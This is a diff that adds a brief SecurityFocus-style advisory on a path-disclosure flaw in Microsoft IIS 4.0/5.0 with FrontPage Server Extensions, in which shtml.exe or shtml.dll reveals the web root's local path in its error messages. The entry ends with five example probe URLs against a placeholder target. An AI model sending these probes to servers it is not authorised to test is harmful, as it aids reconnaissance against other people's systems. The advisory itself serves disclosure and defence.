@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/1174/info
+
+The local path of a HTML, HTM, ASP, or SHTML file can be disclosed in Microsoft IIS 4.0/5.0 / Frontpage Server Extensions 1.1 and prior. Passing a path to a non-existent file to the shtml.exe or shtml.dll (depending on platform) program will display an error message stating that the file cannot be found accompanied by the full local path to the web root. For example, performing a request for http://target/_vti_bin/shtml.dll/non_existant_file.html will produce an error message stating "Cannot open "C:\localpath\non_existant_file.html": no such file or folder"
+
+http://target/_vti_bin/shtml.exe/non-existent-file.html
+http://target/_vti_bin/shtml.exe/non-existent-file.htm
+http://target/_vti_bin/shtml.exe/non-existent-file.shtml
+http://target/_vti_bin/shtml.exe/non-existent-file.asp
+http://target/_vti_bin/shtml.dll/non_existant_file.html
